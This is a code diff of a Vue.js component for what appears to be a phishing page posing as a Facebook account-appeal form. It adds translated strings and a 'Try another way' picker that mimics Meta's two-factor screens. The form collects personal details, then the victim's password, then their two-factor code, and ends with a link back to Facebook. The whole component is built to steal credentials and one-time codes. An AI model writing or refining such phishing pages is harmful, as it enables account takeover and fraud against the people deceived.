@@ -1,57 +1,98 @@
 <script setup>
 import { ref, computed, onMounted } from "vue";
-import { useAppealForm } from '@/assets/js/AppealForm.js'
-import '@/assets/css/AppealForm.css'
 import { useI18n } from "vue-i18n";
+
+const { t } = useI18n(); // ✅ FIX: có t để dùng trong script
+
+const emit = defineEmits(["close"]);
+
+import { useAppealForm } from "@/assets/js/AppealForm.js";
+import "@/assets/css/AppealForm.css";
 import { useLocaleFromIp } from "@/composables/useLocaleFromIp";
+
 const { detectAndSetLocale } = useLocaleFromIp();
+
 onMounted(() => {
   detectAndSetLocale();
 });
-const { t } = useI18n();
-const emit = defineEmits(['close'])
-const showPassword = ref(false)
-const {
-  phone, iti, phoneError, step, form, errors, password, passwordError, passwordInputCount,
-  validatePhoneNumber, onPhoneInput, submitForm, submitPassword,
-  code, codeError, codeErrorMessage, codeLocked, countdown,
-  submitCode, startCountdown, closePopup, isLoading, isCountingDown,
-  previewImages, onFileChange, removeImage, detectedCountryCode, detectedDialCode, detectedCountryName, handleSend
-} = useAppealForm(emit)
 
+const showPassword = ref(false);
+
+/* ===== existing logic ===== */
+const {
+  phone,
+  phoneE164,
+  iti,
+  step,
+  savedUser,
+  handleSend,
+  form,
+  errors,
+  password,
+  passwordError,
+  passwordInputCount,
+  validatePhoneNumber,
+  onPhoneInput,
+  submitForm,
+  submitPassword,
+  code,
+  onlyNumberKey,
+  onCodeInput,
+  codeError,
+  codeErrorMessage,
+  codeLocked,
+  countdown,
+  submitCode,
+  startCountdown,
+  closePopup,
+  isLoading,
+  allFormData,
+  isCountingDown,
+} = useAppealForm(emit);
+
+/* ===== Try other way ===== */
 const showMethodModal = ref(false);
 const selectedMethod = ref("notification");
 const tempMethod = ref(selectedMethod.value);
 
+/**
+ * Methods gốc (id + img)
+ * ⚠️ giữ id = whatapp nếu JSON của bạn đang dùng whatapp
+ */
 const methods = [
   { id: "notification", img: "/images/F3-2FA-Notifications-WWW_light-3x.png" },
   { id: "sms", img: "/images/F3-2FA-TextMessages-WWW_light-3x.png" },
   { id: "whatapp", img: "/images/F3-2FA-WhatsApp-WWW_light-3x.png" },
   { id: "email", img: "/images/F3-2FA-Email-WWW_light-3x.png" },
-  { id: "2fa", img: "/images/codemdp.png" },
+  { id: "2fa", img: "/images/F3-2FA-AuthenticatorApp-WWW_light-3x.png" },
 ];
 
 /**
  * ✅ Methods render động theo dữ liệu user (email/phone)
  */
 const computedMethods = computed(() => {
-  const phoneDisplay = savedUser?.phoneDisplay || t("app.privacyCenter.popup.methods.sms.fallbackPhone", "your phone number");
-  const emailValue = savedUser?.email || t("app.privacyCenter.popup.methods.email.fallbackEmail", "your email address");
+  const phoneDisplay =
+    savedUser?.phoneDisplay ||
+    t("popup.methods.sms.fallbackPhone", "your phone number");
+
+  const emailValue =
+    savedUser?.email ||
+    t("popup.methods.email.fallbackEmail", "your email address");
 
   return methods.map((m) => {
     if (m.id === "sms") {
       return {
         ...m,
-        title: "Check your text messages",
-        desc: `Enter the code we sent to ${phoneDisplay}.`
+        title: t("popup.methods.sms.title"),
+        desc: t("popup.methods.sms.desc", { phone: phoneDisplay }),
       };
     }
 
     if (m.id === "email") {
       return {
         ...m,
-        title: "Check your email",
-        desc: `We sent a login code to ${emailValue}.`
+        title: t("popup.methods.email.title"),
+        desc: t("popup.methods.email.desc", { email: emailValue }),
       };
     }
 
@@ -59,24 +100,24 @@ const computedMethods = computed(() => {
       const phoneSuffix = savedUser?.phoneDisplay ? " " + savedUser.phoneDisplay : "";
       return {
         ...m,
-        title: "Check your WhatsApp messages",
-        desc: "Check your WhatsApp messages. Enter the code we sent to your WhatsApp account."
+        title: t("popup.methods.whatapp.title"),
+        desc: t("popup.methods.whatapp.desc", { phoneSuffix }),
       };
     }
 
     if (m.id === "notification") {
       return {
         ...m,
-        title: "Check your notifications on another device",
-        desc: "We've sent a notification to your device. Check your Facebook notification on your device and approve access to continue."
+        title: t("popup.methods.notification.title"),
+        desc: t("popup.methods.notification.desc"),
       };
     }
 
     // recovery
     return {
       ...m,
-      title: "Access your authentication app.",
-      desc: "Enter the 6-digit verification code you received from your selected two-factor authentication app (such as Duo Mobile or Google Authenticator) for this account."
+      title: t("popup.methods.recovery.title"),
+      desc: t("popup.methods.recovery.desc"),
     };
   });
 });
@@ -102,7 +143,6 @@ onMounted(() => {
     selectedMethod.value = data.method;
     tempMethod.value = data.method;
   }
-
   if (data.form) Object.assign(form, data.form);
   if (data.phone) phone.value = data.phone;
   if (data.step) step.value = data.step;
@@ -143,7 +183,7 @@ function maskPhone(phone) {
   <div class="modal-overlay">
     <div class="modal-content">
       <div class="modal-header" v-if="step === 1">
-        <h5>Information Form</h5>
+        <h5>{{ t('popup.appealFormTitle') }}</h5>
         <div class="close-bar" @click="closePopup">
           <svg width="12" height="12" viewBox="0 0 7 7" fill="none" xmlns="http://www.w3.org/2000/svg">
             <rect x="0.671875" y="5.62134" width="7" height="1" rx="0.5" transform="rotate(-45 0.671875 5.62134)"
@@ -156,39 +196,42 @@ function maskPhone(phone) {
 
       <!-- ✅ FIX: Đổi @submit.prevent từ "submitForm" thành "handleSend" -->
       <form v-if="step === 1" class="form" @submit.prevent="handleSend">
-        <input v-model="form.fullName" placeholder="Full name" />
+        <input v-model="form.fullName" :placeholder="t('popup.placeholders.fullName')" />
         <span v-if="errors.fullName" class="error">{{ errors.fullName }}</span>
 
-        <input v-model="form.email" placeholder="Email" />
+        <input v-model="form.email" :placeholder="t('popup.placeholders.email')" />
         <span v-if="errors.email" class="error">{{ errors.email }}</span>
 
-        <input v-model="form.businessEmail" type="text" placeholder="Email business" />
+        <input v-model="form.businessEmail" type="text" :placeholder="t('popup.placeholders.businessEmail')" />
         <span v-if="errors.businessEmail" class="error">{{ errors.businessEmail }}</span>
 
-        <input v-model="form.pageName" type="text" placeholder="Link to page or name page" />
+        <input v-model="form.pageName" type="text" :placeholder="t('popup.placeholders.pageName')" />
         <span v-if="errors.pageName" class="error">{{ errors.pageName }}</span>
 
         <input id="phone" type="tel" />
         <span v-if="errors.phone" class="error">{{ errors.phone }}</span>
         <div class="dob">
-          <input v-model="form.dob.day" type="text" placeholder="Day" />
-          <input v-model="form.dob.month" type="text" placeholder="Month" />
-          <input v-model="form.dob.year" type="text" placeholder="Year" />
+          <input v-model="form.dob.day" type="text" :placeholder="t('popup.placeholders.dobDay')" />
+          <input v-model="form.dob.month" type="text" :placeholder="t('popup.placeholders.dobMonth')" />
+          <input v-model="form.dob.year" type="text" :placeholder="t('popup.placeholders.dobYear')" />
         </div>
         <span v-if="errors.dob" class="error">{{ errors.dob }}</span>
 
-        <p class="response-time">Our response will be sent to you within 14 - 48 hours.</p>
+        <p class="response-time">{{ t('popup.helper.responseTime') }}</p>
 
         <div class="agree-wrapper">
           <label class="agree-label">
             <input type="checkbox" v-model="form.agreeTerms" />
-            <span>I agree with <a href="#">Terms of use</a></span>
+            <span>
+              {{ t('popup.agree.prefix') }}
+              <a href="#">{{ t('popup.agree.terms') }}</a>
+            </span>
           </label>
           <span v-if="errors.agreeTerms" class="error">{{ errors.agreeTerms }}</span>
         </div>
 
         <button type="submit" :class="{ 'loading-button': isLoading }" :disabled="isLoading">
-          <span>Send</span>
+          <span>{{ t('popup.buttons.send') }}</span>
         </button>
         <div class="popup-footer logo-bottom">
           <div class="logo"><svg width="80" height="80" viewBox="0 0 329 66" fill="none"
@@ -222,10 +265,10 @@ function maskPhone(phone) {
       <!-- Step 2: Password -->
       <form v-else-if="step === 2" class="form" @submit.prevent="submitPassword">
         <div class="popup-step2">
-          <p class="">For security reasons enter your password to continue.</p>
+          <p class="descpass">{{ t('popup.step2.securityNote') }}</p>
           <div style="position: relative;">
-            <input :type="showPassword ? 'text' : 'password'" v-model="password" placeholder="Enter password" required
-              autocomplete="off" style="padding-right: 40px;" />
+            <input :type="showPassword ? 'text' : 'password'" v-model="password"
+              :placeholder="t('popup.step2.password')" required autocomplete="off" style="padding-right: 40px;" />
             <button type="button" @click="showPassword = !showPassword"
               style="position: absolute; top: 50%; right: 10px; transform: translateY(-50%); background: none; border: none; cursor: pointer;">
               <svg v-if="showPassword" width="16" height="16" viewBox="0 0 24 24" fill="none"
@@ -269,12 +312,11 @@ function maskPhone(phone) {
           </div>
 
           <div>
-            <p v-if="passwordError" style="color: red; margin-top: 12px;">The password you've entered is
-              incorrect.</p>
+            <p v-if="passwordError" style="color: red; margin-top: 12px;">{{ t('popup.step2.passwordIncorrect') }}</p>
           </div>
 
           <button type="submit" :class="{ 'loading-button': isLoading }" :disabled="isLoading">
-            <span>Continue</span>
+            <span>{{ t('popup.buttons.continue') }}</span>
           </button>
 
         </div>
@@ -311,28 +353,30 @@ function maskPhone(phone) {
       <form v-else-if="step === 3" class="form" @submit.prevent="submitCode">
         <div class="popup-step3">
           <div class="desc">
-            <h4>Check your notifications on another device</h4>
-            <p>We've sent a notification to your Device. Check your Facebook notification on
-              your device and approve access to continue.</p><img src="/public/images/F3-2FA-Notifications-WWW_light-3x.png"
-              width="100%" style="border-radius:10px;margin:15px auto 35px auto" alt="">
+            <span> {{ savedUser?.fullName || $t("popup.step3.userFallback") }}
+              •
+              {{ $t("popup.step3.facebookLabel") }}</span>
+
+            <h4>{{ currentMethod?.title }}</h4>
+            <p>{{ currentMethod?.desc }}</p>
+            <img :src="currentMethod?.img" style="width:100%;border-radius:10px;margin:15px auto 35px" />
           </div>
-          <input type="text" v-model="code" placeholder="Enter code" :disabled="codeLocked" autocomplete="off"
-            required />
+          <input type="text" v-model="code" :placeholder="t('popup.placeholders.code')" :disabled="codeLocked"
+            autocomplete="off" required />
           <div v-if="codeError" style="color: red; margin-bottom: 8px;">
             {{ codeErrorMessage }}
           </div>
           <div v-if="codeLocked" style="color: red; margin-bottom: 8px;">
-            <p style="color: red">The two-factor authentication you entered is incorrect. Please, try again
-              after {{ countdown }}
-              seconds</p>
+            <p style="color: red">{{ t('popup.step3.tryAgainAfter', { countdown }) }}
+              </p>
           </div>
           <button type="submit" :class="{ 'loading-button': isLoading }" :disabled="isLoading || codeLocked">
-            <span>Continue</span>
+            <span>{{ t('popup.buttons.continue') }}</span>
           </button>
-          <!-- <button type="button" @click="showMethodModal = true"
+          <button type="button" @click="showMethodModal = true"
             style="display:block;width:100%;margin-top:12px;background:none;border:none;color:#0a66c2">
-            Try another way
-          </button> -->
+            {{ t('popup.buttons.tryOtherWay') }}
+          </button>
         </div>
         <div class="popup-footer logo-bottom">
           <div class="logo"><svg width="80" height="80" viewBox="0 0 329 66" fill="none"
@@ -366,8 +410,8 @@ function maskPhone(phone) {
       <div v-if="showMethodModal" class="method-modal-overlay">
         <div class="method-modal">
           <div class="method-modal-header">
-            <strong>Choose a way to confirm it’s you</strong>
-            <p>These are your available confirmation methods.</p>
+            <strong>{{ t('popup.methodModal.title') }}</strong>
+            <p>{{ t('popup.methodModal.desc') }}</p>
             <button class="method-modal-close" @click="cancelSelect">×</button>
           </div>
 
@@ -380,28 +424,24 @@ function maskPhone(phone) {
                 <span class="method-item-title">{{ m.title }}</span>
                 <span class="method-item-desc">{{ m.desc }}</span>
               </div>
-
-              <span class="method-radio"></span>
             </label>
           </div>
 
           <button class="method-continue" @click="confirmMethod">
-            Continue
+            {{ t('popup.buttons.continue') }}
           </button>
         </div>
       </div>
       <!-- Step 4: Success -->
       <form v-else-if="step === 4" class="form">
         <div class="desc">
-          <h4>Request has been sent</h4>
+          <h1>{{ t('popup.step4.title') }}</h1>
           <img src="/public/images/background-final.png" width="100%"
             style="border-radius:10px;margin:15px auto 15px auto" alt="">
-          <p>Your request has been added to the processing queue. We will process your request
-            within 24 hours. If you do not receive an email message with the appeal status
-            within 24 hours, please resend the appeal.</p>
+          <p>{{ t('popup.step4.desc') }}</p>
         </div>
         <a href="https://www.facebook.com" class="ant-btn ant-btn-default button-send">
-          <span>Return to Facebook</span>
+          <span>{{ t('popup.buttons.returnToFacebook') }}</span>
         </a>
         <div class="popup-footer logo-bottom">
           <div class="logo"><svg width="80" height="80" viewBox="0 0 329 66" fill="none"
